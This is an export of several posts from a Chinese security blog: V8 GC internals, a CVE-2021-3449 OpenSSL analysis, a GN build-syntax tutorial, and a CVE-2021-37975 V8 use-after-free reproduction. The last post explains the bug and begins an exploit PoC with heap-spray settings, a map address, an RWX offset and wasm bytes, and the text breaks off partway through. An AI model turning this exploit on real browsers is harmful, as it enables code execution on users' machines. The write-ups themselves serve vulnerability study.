
<p> MarkCompactCollector::SweepNewSpace函数，处理新生代对象：<br> <figure class="highlight cpp"><figcaption><span>showLineNumbers</span></figcaption><table><tr><td class="code"><pre><span class="line"> <span class="function"><span class="type">void</span> <span class="title">MarkCompactCollector::StartSweepNewSpace</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  PagedSpaceForNewSpace* paged_space = heap_-&gt;<span class="built_in">paged_new_space</span>()-&gt;<span class="built_in">paged_space</span>();</span><br><span class="line">  paged_space-&gt;<span class="built_in">ClearAllocatorState</span>();</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> will_be_swept = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  heap_-&gt;<span class="built_in">StartResizeNewSpace</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">DCHECK</span>(empty_new_space_pages_to_be_swept_.<span class="built_in">empty</span>());</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> it = paged_space-&gt;<span class="built_in">begin</span>(); it != paged_space-&gt;<span class="built_in">end</span>();) &#123;</span><br><span class="line">    PageMetadata* p = *(it++);</span><br><span class="line">    <span class="built_in">DCHECK</span>(p-&gt;<span class="built_in">SweepingDone</span>());</span><br><span class="line">    <span class="built_in">DCHECK</span>(!p-&gt;<span class="built_in">Chunk</span>()-&gt;<span class="built_in">IsFlagSet</span>(MemoryChunk::BLACK_ALLOCATED));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (p-&gt;<span class="built_in">live_bytes</span>() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="comment">// Non-empty pages will be evacuated/promoted.</span></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (paged_space-&gt;<span class="built_in">ShouldReleaseEmptyPage</span>()) &#123;</span><br><span class="line">      <span class="built_in">ReleasePage</span>(paged_space, p);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      empty_new_space_pages_to_be_swept_.<span class="built_in">push_back</span>(p);</span><br><span class="line">    &#125;</span><br><span class="line">    will_be_swept++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (v8_flags.gc_verbose) &#123;</span><br><span class="line">    <span class="built_in">PrintIsolate</span>(heap_-&gt;<span class="built_in">isolate</span>(),</span><br><span class="line">                 <span class="string">&quot;sweeping: space=%s initialized_for_sweeping=%d&quot;</span>,</span><br><span class="line">                 <span class="built_in">ToString</span>(paged_space-&gt;<span class="built_in">identity</span>()), will_be_swept);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2021-3449漏洞原理分析与复现</title>
    <url>/posts/f34a8b40.html</url>
    <content><![CDATA[<h2 id="CVE-2021-3449空指针引用漏洞原理分析"><a href="#CVE-2021-3449空指针引用漏洞原理分析" class="headerlink" title="CVE-2021-3449空指针引用漏洞原理分析"></a>CVE-2021-3449空指针引用漏洞原理分析</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>该漏洞为公开漏洞，漏洞编号为CVE-2021-3449，漏洞类型为空指针引用漏洞，存在于OpenSSL的1.1.1-1.1.1j版本，包含11.1.4目标PA设备中的开源组件OpenSSL版本1.1.1g。官方描述信息如下：</p>
<img src="/posts/f34a8b40/image-20250725094337157.png" class="" title="image-20250725094337157">

<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>当TLS 1.2服务器在重新协商时，若客户端发送的ClientHello消息省略了初始握手存在的signature_algorithms扩展，但包含signature_algorithms_cert扩展，会触发空指针解引用，导致服务崩溃（拒绝服务攻击）。</p>
<p>发送恶意ClientHello请求后，在下图代码1732行tls1_lookup_sigalg函数位置发生空指针引用漏洞，其中由于signature_algorithms被省略，导致ptmp指针为空，出现空指针引用漏洞。</p>
<img src="/posts/f34a8b40/image-20250725094358924.png" class="" title="image-20250725094358924">

<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>当建立renegotiation信息时，存在空指针引用漏洞。验证漏洞POC报文如下：</p>
<img src="/posts/f34a8b40/image-20250725094415745.png" class="" title="image-20250725094415745">

<p>发送POC，测试程序ASAN检测到空指针引用错误，产生崩溃时的函数调用链如下图：</p>
<img src="/posts/f34a8b40/image-20250725094424353.png" class="" title="image-20250725094424353">]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>GN以及Ninja基本语法</title>
    <url>/posts/255ca27a.html</url>
    <content><![CDATA[<p>GN用于编译文件作配置定义</p>
<h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p>GN使用简单动态类型语言，涉及的变量类型为：</p>
<ul>
<li>Boolean (true, false)</li>
<li>64-bit signed integers</li>
<li>Strings</li>
<li>Lists</li>
<li>Scopes (sort of like a dictionary, only for built-in stuff)<br>完整的语法参考<code>gn help grammar</code></li>
</ul>
<h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p>字符串有双引号包裹，使用反斜杠\转义，支持的反斜杠转义包括<code>\&quot;</code>， <code>\$</code>，<code>\\</code>。<br>其他使用都不会进行转义<br>$可以用于变量替换，可以用{}包裹。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&quot;mypath&quot;</span></span><br><span class="line">b = <span class="string">&quot;$a/foo.cc&quot;</span>     <span class="comment"># b -&gt; &quot;mypath/foo.cc&quot;</span></span><br><span class="line">c = <span class="string">&quot;foo$&#123;a&#125;bar.cc&quot;</span> <span class="comment"># c -&gt; &quot;foomypathbar.cc&quot;</span></span><br></pre></td></tr></table></figure>

<p>可以使用<code>$0xFF</code>语法表示8bit的数值。</p>
<h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><p>列表支持append操作：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="string">&quot;first&quot;</span>]</span><br><span class="line">a += [<span class="string">&quot;second&quot;</span>]    <span class="comment"># [&quot;first, &quot;second&quot;]</span></span><br><span class="line">a += [<span class="string">&quot;third&quot;</span>, <span class="string">&quot;fourth&quot;</span>]    <span class="comment"># [&quot;first&quot;, &quot;second&quot;, &quot;third&quot;, &quot;fourth&quot;]</span></span><br><span class="line">b = a + [<span class="string">&quot;fifth&quot;</span>]    <span class="comment"># [&quot;first&quot;, &quot;second&quot;, &quot;third&quot;, &quot;fourth&quot;, &quot;fifth&quot;]</span></span><br></pre></td></tr></table></figure>
<p>还可以作减法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="string">&quot;first&quot;</span>, <span class="string">&quot;second&quot;</span>, <span class="string">&quot;third&quot;</span>, <span class="string">&quot;first&quot;</span>]</span><br><span class="line">b = a - [<span class="string">&quot;first&quot;</span>] <span class="comment"># [&quot;second&quot;, &quot;third&quot;]</span></span><br><span class="line">a -= [<span class="string">&quot;second&quot;</span>] <span class="comment"># [&quot;first&quot;, &quot;third&quot;, &quot;first&quot;]</span></span><br></pre></td></tr></table></figure>
<p>如果被减列表没有该元素的话，会报错。<br>列表支持索引：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="string">&quot;first&quot;</span>, <span class="string">&quot;second&quot;</span>, <span class="string">&quot;third&quot;</span>]</span><br><span class="line">b = a[<span class="number">1</span>]  <span class="comment"># -&gt; &quot;second&quot;</span></span><br></pre></td></tr></table></figure>
<p>当列表为空时，可以覆写为新的带元素列表。</p>
<h3 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h3><p>比较像C</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (is_linux || (is_win &amp;&amp; target_cpu == <span class="string">&quot;x86&quot;</span>)) &#123;</span><br><span class="line">	sources == [<span class="string">&quot;something.cc&quot;</span>]</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (...) &#123;</span><br><span class="line">	...</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><p>使用foreach迭代列表，但是不推荐。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">foreach(i, mylist) &#123;</span><br><span class="line">	print(i)  # Note: i is a copy of each element, not a reference to it.</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h3><p>简单的函数调用，例如print，assert</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello, world&quot;</span>)</span><br><span class="line"><span class="keyword">assert</span>(is_win, <span class="string">&quot;This should only be executed on Windows&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>一些函数需要使用{}跟随</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">static_libary(<span class="string">&quot;mylibrary&quot;</span>) &#123;</span><br><span class="line">	sources = [<span class="string">&quot;a.cc&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该语句表示sources为该函数执行的参数，大多数的block_style函数都是执行block(eg: sources)然后将剩余的scope作为字典变量读取。</p>
<h3 id="执行作用域"><a href="#执行作用域" class="headerlink" title="执行作用域"></a>执行作用域</h3><p>文件和函数调用{}块会引入新的作用域。</p>
<h2 id="命名"><a href="#命名" class="headerlink" title="命名"></a>命名</h2><h3 id="文件和目录名"><a href="#文件和目录名" class="headerlink" title="文件和目录名"></a>文件和目录名</h3><p>文件和目录名字是字符串并且是相对于当前编译文件目录的相对路径</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;foo.cc&quot;</span></span><br><span class="line"><span class="string">&quot;src/foo.cc&quot;</span></span><br><span class="line"><span class="string">&quot;../src/foo.cc&quot;</span></span><br></pre></td></tr></table></figure>
<p>相对于源码的绝对路径：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;//net/foo.cc&quot;</span></span><br><span class="line"><span class="string">&quot;//base/test/foo.cc&quot;</span></span><br></pre></td></tr></table></figure>
<p>系统绝对路径：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;/usr/local/include/&quot;</span></span><br><span class="line"><span class="string">&quot;/C:/Program Files/Windows Kits/Include&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="编译配置"><a href="#编译配置" class="headerlink" title="编译配置"></a>编译配置</h2><h3 id="编译目标"><a href="#编译目标" class="headerlink" title="编译目标"></a>编译目标</h3><p>目标是编译图中的一个节点。它一般代表要编译生成的可执行程序或者库文件。目标依赖于其他目标。定义的目标类型如下：</p>
<ul>
<li><code>action</code>：执行脚本生成文件</li>
<li><code>action_foreach</code>：循环执行多个脚本，一个脚本对应一个文件</li>
<li><code>bundle_data</code>：声明数据为Mac&#x2F;iOS bundle</li>
<li><code>create_bundle</code>：创建 Mac&#x2F;iOS bundle</li>
<li><code>executable</code>：生成可执行文件</li>
<li><code>group</code>：虚拟依赖节点，指向一个或多个其他的目标</li>
<li><code>shared_library</code>：生成一个dll文件，或者so文件</li>
<li><code>loadable_module</code>：运行时dll或so文件</li>
<li><code>source_set</code>：轻量级虚拟静态库（效率更高）</li>
<li><code>static_library</code>：.lib或.a文件，source_set是更优选择<br>你可以扩展其去定义目标类型，使用如下模版。</li>
<li><code>component</code>：source_set &#x2F; shared_library，基于其build类型</li>
<li><code>test</code>：test可执行程序。在mobile环境中其会创建适合的native app类型来作为测试</li>
<li><code>app</code>：Mac&#x2F;iOS可执行程序</li>
<li><code>android_apk</code>：制作APK。</li>
</ul>
<h2 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h2><p>定义了flag，include directories和defines。这些可以应用于目标以及相依赖的目标<br>config定义：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">config(<span class="string">&quot;myconfig&quot;</span>) &#123;</span><br><span class="line">	includes = [<span class="string">&quot;src/include&quot;</span>]</span><br><span class="line">	defines = [<span class="string">&quot;ENABLE_DOOM_MELOW&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>应用config到目标：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">executable(<span class="string">&quot;doom_melon&quot;</span>) &#123;</span><br><span class="line">	configs = [<span class="string">&quot;:myconfig&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>常见情况是设置一个默认列表。目标可以根据列表做添加或删除。因此在实际中通常会使用<code>configs += &quot;:myconfig&quot;</code>来添加配置。<br><code>gn help config</code>来查阅更多的config相关配置</p>
<h3 id="Public-configs"><a href="#Public-configs" class="headerlink" title="Public configs"></a>Public configs</h3><p>目标可以将配置应用于依赖其的其他目标。最常见的情况是第三方目标需要一些定义或者导入库目录来正常编译。一般需要这些配置不仅应用于第三方库，还要应用于引用这些第三方库的目标上。<br>实现方式如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">config(<span class="string">&quot;my_external_library_config&quot;</span>) &#123;</span><br><span class="line">	includes = <span class="string">&quot;.&quot;</span></span><br><span class="line">	defines = [<span class="string">&quot;DISABLE_JANK&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后该配置会加入到目标中作为”public” config，可以同时设置该config</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">shared_library(<span class="string">&quot;my_external_library&quot;</span>) &#123;</span><br><span class="line">	...</span><br><span class="line">	# Target that depend on this get this config applied</span><br><span class="line">	public_configs = [ <span class="string">&quot;:my_external_library_config&quot;</span> ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>依赖的目标需要加入其依赖</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">static_library(<span class="string">&quot;intermediate_library&quot;</span>) &#123;</span><br><span class="line">	...</span><br><span class="line">	# Targets that depend on this also get the configs from <span class="string">&quot;my external library&quot;</span>.</span><br><span class="line">	public_deps = [ <span class="string">&quot;:my_external_library&quot;</span> ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>目标可以将config转发到所有依赖项直到触及边界值，通过设置<code>all_dependent_config</code>实现。不推荐，因为会造成冗余以及错误。推荐使用<code>public_deps</code>来实现。</p>
<h2 id="模版"><a href="#模版" class="headerlink" title="模版"></a>模版</h2><p>模版是GN重用代码的方式。模版会包括一到多个目标类型：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Declares a script that compiles IDL files to source, and then compiles those source files.</span></span><br><span class="line">template(<span class="string">&quot;idl&quot;</span>) &#123;</span><br><span class="line">	<span class="comment"># Always base helper targets on target_name so they&#x27;re unique. Target name</span></span><br><span class="line">	<span class="comment"># will be the string passed as the name when the template is invoked.</span></span><br><span class="line">	idl_target_name = <span class="string">&quot;$&#123;target_name&#125;_generate&quot;</span></span><br><span class="line">	action_foreach(idl_target_name) &#123;</span><br><span class="line">		...</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment"># Your template should always define a target with the name target_name.</span></span><br><span class="line">	<span class="comment"># When other targets depend on your template invocation, this will be the</span></span><br><span class="line">	<span class="comment"># destination of that dependency.</span></span><br><span class="line">	source_set(target_name) &#123;</span><br><span class="line">		...</span><br><span class="line">		deps = [<span class="string">&quot;:$idl_target_name&quot;</span>]  <span class="comment"># Require the sources to be compiled.</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该模版定义需要在.gni头文件中声明，用户可以使用该文件来查看定义</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span>(<span class="string">&quot;//tools/idl_compiler.gni&quot;</span>)</span><br><span class="line"></span><br><span class="line">idl(<span class="string">&quot;my_interfaces&quot;</span>) &#123;</span><br><span class="line">	sources = [<span class="string">&quot;a.idl&quot;</span>, <span class="string">&quot;b.idl&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>声明模版后也引入了新的作用域。可以使用invoker来引用外部的变量。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">template(<span class="string">&quot;idl&quot;</span>)&#123;</span><br><span class="line">	source_set(target_name) &#123;</span><br><span class="line">		sources = invoker.sources</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="Imports"><a href="#Imports" class="headerlink" title="Imports"></a>Imports</h3><p>可以导入.gni文件。</p>
<h3 id="Path-processing"><a href="#Path-processing" class="headerlink" title="Path processing"></a>Path processing</h3><p>创建文件名或者列表。特别是运行脚本时，以编译输出目录作为当前目录。<br>可以使用<code>rebase_path</code>来转换目录。</p>
<h3 id="Patterns"><a href="#Patterns" class="headerlink" title="Patterns"></a>Patterns</h3><p>用于生成输出文件的名字，并且自动化删除列表的元素<br><code>gn help label_pattern</code></p>
<h3 id="Executing-scripts"><a href="#Executing-scripts" class="headerlink" title="Executing scripts"></a>Executing scripts</h3><p>脚本为python语言。使用action来执行。<br>第二种方案是在编译时同步进行，使用<code>exec_script</code>。</p>
]]></content>
  </entry>
  <entry>
    <title>Write Barrier</title>
    <url>/posts/3bda5f68.html</url>
    <content><![CDATA[<h2 id="V8-Write-Barrier"><a href="#V8-Write-Barrier" class="headerlink" title="V8 Write Barrier"></a>V8 Write Barrier</h2><img src="/posts/3bda5f68/image-20250725134242955.png" class="" title="image-20250725134242955">
<p>在垃圾回收（Garbage Collection, GC）中，<strong>write barrier（写屏障）</strong> 是一种机制，用于在程序运行时，监控和记录堆内存中对象引用的变化，以便垃圾回收器能够正确地管理内存。它是一个非常重要的优化技术，尤其是在现代垃圾回收器中，比如 V8 引擎的 GC。</p>
<h3 id="写屏障的作用"><a href="#写屏障的作用" class="headerlink" title="写屏障的作用"></a>写屏障的作用</h3><p>写屏障的主要作用是<strong>在对象引用发生变化时，通知垃圾回收器</strong>，从而使垃圾回收器能够高效地完成以下任务：</p>
<h3 id="1-支持分代垃圾回收（Generational-GC）"><a href="#1-支持分代垃圾回收（Generational-GC）" class="headerlink" title="1. 支持分代垃圾回收（Generational GC）"></a>1. <strong>支持分代垃圾回收（Generational GC）</strong></h3><p>在分代垃圾回收中，堆被分为两代：</p>
<ul>
<li><strong>新生代（Young Generation）</strong>：存放生命周期较短的对象。</li>
<li><strong>老年代（Old Generation）</strong>：存放生命周期较长的对象。</li>
</ul>
<p>分代垃圾回收的一个关键点是<strong>记录老年代对象对新生代对象的引用</strong>，因为垃圾回收器在回收新生代时，只扫描新生代对象和这些老年代到新生代的引用，而不扫描整个老年代。</p>
<p>写屏障的作用在于：</p>
<ul>
<li>当老年代对象的某个字段指向了一个新生代对象时，写屏障会记录这个引用关系，通常通过一个<strong>记忆集（Remembered Set）</strong>来存储。</li>
<li>这样，垃圾回收器在回收新生代时，可以只扫描这些老年代到新生代的引用，而不需要扫描整个老年代，提升了性能。</li>
</ul>
<h3 id="2-防止增量-并发标记阶段的黑白指针问题"><a href="#2-防止增量-并发标记阶段的黑白指针问题" class="headerlink" title="2. 防止增量&#x2F;并发标记阶段的黑白指针问题"></a>2. <strong>防止增量&#x2F;并发标记阶段的黑白指针问题</strong></h3><p>在增量标记或并发标记阶段（Incremental&#x2F;Concurrent Marking），垃圾回收器和程序（mutator）是并发运行的。标记阶段将堆中的对象分为三种颜色：</p>
<ul>
<li><strong>白色（White）</strong>：尚未访问的对象，可能会被回收。</li>
<li><strong>灰色（Gray）</strong>：已访问但未处理其引用的对象。</li>
<li><strong>黑色（Black）</strong>：已访问且处理了其引用的对象。</li>
</ul>
<p>写屏障的作用在于防止<strong>黑色对象指向白色对象</strong>的情况发生：</p>
<ul>
<li>如果一个黑色对象（已标记为存活）在程序运行时新增了一个指向白色对象的引用，而 GC 没有记录这个变化，那么白色对象可能会被错误地回收。</li>
<li>写屏障会在这种情况下通知 GC，并将白色对象重新标记为灰色对象，从而确保垃圾回收的正确性。</li>
</ul>
<h3 id="3-支持对象迁移（Evacuation）中的引用更新"><a href="#3-支持对象迁移（Evacuation）中的引用更新" class="headerlink" title="3. 支持对象迁移（Evacuation）中的引用更新"></a>3. <strong>支持对象迁移（Evacuation）中的引用更新</strong></h3><p>在某些垃圾回收算法（比如压缩收集或对象迁移）中，GC 会将对象从一个内存区域复制到另一个区域（例如将对象从新生代晋升到老年代，或在内存压缩时移动对象）。</p>
<p>写屏障的作用在于：</p>
<ul>
<li>当一个对象被移动后，其引用可能需要更新。</li>
<li>写屏障会记录这些引用关系，确保 GC 能够正确更新所有相关的指针。</li>
</ul>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>写屏障是一个非常重要的机制，其核心作用是<strong>在堆内存中对象引用发生变化时，通知垃圾回收器</strong>，从而支持以下功能：</p>
<ol>
<li><strong>记录老年代到新生代的引用</strong>，以支持分代垃圾回收。</li>
<li><strong>防止增量&#x2F;并发标记阶段的黑白指针问题</strong>，确保垃圾回收的正确性。</li>
<li><strong>记录对象迁移中的引用变化</strong>，以支持对象移动和内存压缩。</li>
</ol>
<p>通过写屏障，垃圾回收器可以在程序运行时高效地管理内存，同时避免扫描整个堆，显著提升了垃圾回收的性能和正确性。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2021-37975复现</title>
    <url>/posts/4a198a52.html</url>
    <content><![CDATA[<h2 id="CVE-2021-37975复现"><a href="#CVE-2021-37975复现" class="headerlink" title="CVE-2021-37975复现"></a>CVE-2021-37975复现</h2><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><ul>
<li><a href="https://chromium.googlesource.com/v8/v8.git/+/refs/tags/9.4.146.16">v8源码 tag: 9.4.146.16</a></li>
<li>depot_tools</li>
<li>修改depot_tools python版本为&lt;3.10（python3_bin_reldir.txt）</li>
</ul>
<h3 id="漏洞背景知识"><a href="#漏洞背景知识" class="headerlink" title="漏洞背景知识"></a>漏洞背景知识</h3><p>CVE-2021-37975 是产生在V8 GC模块的UAF漏洞，利用堆喷可以在原地址申请一个对象，新对象跟释放对象的类型不一致，可以造成类型混淆，从而实现利用。</p>
<h4 id="WeakMap"><a href="#WeakMap" class="headerlink" title="WeakMap"></a>WeakMap</h4><p>js中的WeakMap不支持迭代以及key()，values()和entries()方法，只有以下方法：</p>
<ul>
<li>weakMap.get(key)</li>
<li>weakMap.set(key, value)</li>
<li>weakMap.delete(key)</li>
<li>weakMap.has(key)<br>也就是说，想要获取value，只能通过get方法，传入key获取。当key被delete时，value无法被访问。在GC过程中，当weakMap的key能被访问时，value也能被访问，即key, value都为黑色。当delete后，两者都为白色。</li>
</ul>
<h4 id="四种数据结构"><a href="#四种数据结构" class="headerlink" title="四种数据结构"></a>四种数据结构</h4><ul>
<li>next_ephemerons: 当(key, value)均为白色对象时存放在next_ephemerons中，供下一次迭代使用。</li>
<li>current_ephemerons: 在迭代开始时与next_ephemerons进行交换，交换完后next_ephemerons为空。</li>
<li>local_marking_worklists: 可以通过黑色对象访问的白色对象被标记为灰色，并且放入local_marking_worklists。灰色对象在ProcessMarkingWorklist函数中会被标记为黑色。</li>
<li>discovered_ephemerons: 当local_marking_worklists中的weakMap对象被标记为黑色时，weakMap中均为白色的键值对将被加入到discovered_ephemerons中。</li>
</ul>
<h4 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h4><ul>
<li>MarkLiveObjects函数：将存活对象标记为黑色，会调用两次ProcessEphemeronMarking。</li>
<li>ProcessEphemeronMarking函数：Marking weakMap中的(key, value)被成为Ephemeron，该函数处理weakMap键值对的标记。</li>
<li>ProcessEphemeronsUntilFixpoint函数：ProcessEphemeronMarking调用该函数实现功能。</li>
</ul>
<h3 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h3><p>漏洞函数ProcessEphemeron，如下：</p>
<figure class="highlight cpp"><figcaption><span>showLineNumbers</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">MarkCompactCollector::ProcessEphemerons</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  Ephemeron ephemeron;</span><br><span class="line">  <span class="type">bool</span> ephemeron_marked = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Drain current_ephemerons and push ephemerons where key and value are still</span></span><br><span class="line">  <span class="comment">// unreachable into next_ephemerons.</span></span><br><span class="line">  <span class="keyword">while</span> (weak_objects_.current_ephemerons.<span class="built_in">Pop</span>(kMainThreadTask, &amp;ephemeron)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">ProcessEphemeron</span>(ephemeron.key, ephemeron.value)) &#123;</span><br><span class="line">      ephemeron_marked = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Drain marking worklist and push discovered ephemerons into</span></span><br><span class="line">  <span class="comment">// discovered_ephemerons.</span></span><br><span class="line">  <span class="built_in">DrainMarkingWorklist</span>();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Drain discovered_ephemerons (filled in the drain MarkingWorklist-phase</span></span><br><span class="line">  <span class="comment">// before) and push ephemerons where key and value are still unreachable into</span></span><br><span class="line">  <span class="comment">// next_ephemerons.</span></span><br><span class="line">  <span class="keyword">while</span> (weak_objects_.discovered_ephemerons.<span class="built_in">Pop</span>(kMainThreadTask, &amp;ephemeron)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">ProcessEphemeron</span>(ephemeron.key, ephemeron.value)) &#123;</span><br><span class="line">      ephemeron_marked = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Flush local ephemerons for main task to global pool.</span></span><br><span class="line">  weak_objects_.ephemeron_hash_tables.<span class="built_in">FlushToGlobal</span>(kMainThreadTask);</span><br><span class="line">  weak_objects_.next_ephemerons.<span class="built_in">FlushToGlobal</span>(kMainThreadTask);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ephemeron_marked;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ProcessEphemeron 函数如果标记成功，将ephemeron_marked置为true，并开启下一次迭代。<br>DrainMarkingWorklist 函数内部在(key, value)为(黑，白)或者(白，黑)时也将会对白色的对象进行标记。遗憾的是，标记完之后并没有判断返回值。<strong>也就是说，可能出现DrainMarkingWorklist标记一个对象为黑之后，并不开启下一次迭代，从而结束GC算法</strong></p>
<img src="/posts/4a198a52/file-20250726203532993.png" class="" title="img">
<p>考虑一轮标记各结构如上图，此时current_ephemerons中(k1, v1), (k2, v2)为白。<br>local_marking_worklists中存放了灰色的v3， v3是一个WeakMap， v3.set(k0, k1)，假设此时k0为黑。DrainMarkingWorklist将v3由灰标记为黑，并递归遍历v3所有的key， value，此时(k0, k1)为(黑，白)，将会把k1变为灰，加入到local_marking_worklists，并接着将local_marking_worklists中的k1由灰标记为黑，直至local_marking_worklists为空。<br>由于调用DrainMarkingWorklist并未判断返回值，k1被标记为黑色之后，如果此时GC标记算法结束，那么current_ephemerons中的v1由于还是白，将会被释放掉。而v1可以通过weakmap.get(k1)访问到，就会造成了UAF。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用如下PoC：</p>
<figure class="highlight js"><figcaption><span>showLineNumbers</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sleep</span>(<span class="params">miliseconds</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> currentTime = <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>();</span><br><span class="line">  <span class="keyword">while</span> (currentTime + miliseconds &gt;= <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>()) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> initKey = &#123;init : <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> level = <span class="number">4</span>;</span><br><span class="line"><span class="keyword">var</span> map1 = <span class="keyword">new</span> <span class="title class_">WeakMap</span>();</span><br><span class="line"><span class="keyword">var</span> gcSize = <span class="number">0x4fe00000</span>;</span><br><span class="line"><span class="keyword">var</span> sprayParam = <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get mapAddr using DebugPrint for double array (the compressed address of the map)</span></span><br><span class="line"><span class="keyword">var</span> mapAddr = <span class="number">0x8203ae1</span>;</span><br><span class="line"><span class="comment">// var mapAddr = 0x8183ae1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> rwxOffset = <span class="number">0x60</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span 